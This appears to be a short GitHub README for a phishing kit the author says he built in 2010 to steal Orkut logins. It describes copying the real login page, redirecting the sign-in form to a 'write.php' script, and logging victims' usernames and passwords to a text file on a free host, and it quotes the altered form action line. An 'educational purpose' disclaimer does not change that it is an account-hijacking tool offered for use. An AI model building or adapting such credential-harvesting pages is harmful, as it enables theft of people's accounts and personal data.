# Orkut-Phising
 Warning: Only meant for educational purpose. The author is not responsible for what a reader does with this info. 

 I made this back in 2010. To hack into an Orkut account through the Phising Technique.    

First, a link(of index.htm) is sent to the victim and he opens it. Thinking its the real Orkut login page, he enters all the login info. When he clicks on the signin button, instead of being logged into Orkut, his login details are written on a file named passes.txt. I can access that file from the host website and I have his login credentials now.   

This has 2 files. Which I hosted on a free server. 

1. Index.htm
2. Write.php


index.htm was made by first copying the source code of the Orkut login page. Then modifying it by adding this in line 128 to signin button action.  action=write.php id="https://www.google.com/accounts/ServiceLoginAuth?service=orkut" 

Write.php creates a passes.text file. And then writes the username and password to it.



